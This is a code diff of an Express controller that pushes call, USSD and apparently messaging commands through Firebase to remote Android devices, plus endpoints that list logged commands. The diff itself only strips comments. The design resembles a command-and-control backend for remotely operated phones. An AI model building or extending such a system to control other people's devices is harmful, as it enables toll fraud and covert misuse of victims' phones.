@@ -2,9 +2,6 @@ import { rtdb } from "../config/db.js";
 
 const ROOT = "commandCenter";
 
-/* ============================================================
-   ⭐ SEND COMMAND (POST API)
-============================================================ */
 export const handleDeviceCommand = async (req, res) => {
   try {
     const { uniqueid, action, to, body, code, simSlot } = req.body;
@@ -34,7 +31,6 @@ export const handleDeviceCommand = async (req, res) => {
       });
     }
 
-    // ⭐ CALL / USSD COMMAND
     if (action === "call" || action === "ussd") {
       commandData.code = code;
 
@@ -45,10 +41,8 @@ export const handleDeviceCommand = async (req, res) => {
       });
     }
 
-    // ⭐ Send command to device (Android listener)
     await rtdb.ref(`${ROOT}/deviceCommands/${uniqueid}`).set(commandData);
 
-    // ⭐ Save global log
     await rtdb.ref(`${ROOT}/logs`).push({
       uniqueid,
       ...commandData,
@@ -70,9 +64,7 @@ export const handleDeviceCommand = async (req, res) => {
   }
 };
 
-/* ============================================================
-   ⭐ GET ALL COMMANDS OF ALL DEVICES
-============================================================ */
+
 export const getAllCommands = async (req, res) => {
   try {
     const snap = await rtdb.ref(`${ROOT}/commands`).get();
@@ -102,14 +94,12 @@ export const getAllCommands = async (req, res) => {
     return res.json({ success: true, data: result });
 
   } catch (err) {
-    console.error("❌ ERROR:", err);
+    console.error(" ERROR:", err);
     return res.status(500).json({ success: false, message: "Server error" });
   }
 };
 
-/* ============================================================
-   ⭐ GET ALL COMMANDS FOR ONE DEVICE
-============================================================ */
+
 export const getCommandsByDevice = async (req, res) => {
   try {
     const { uniqueid } = req.params;
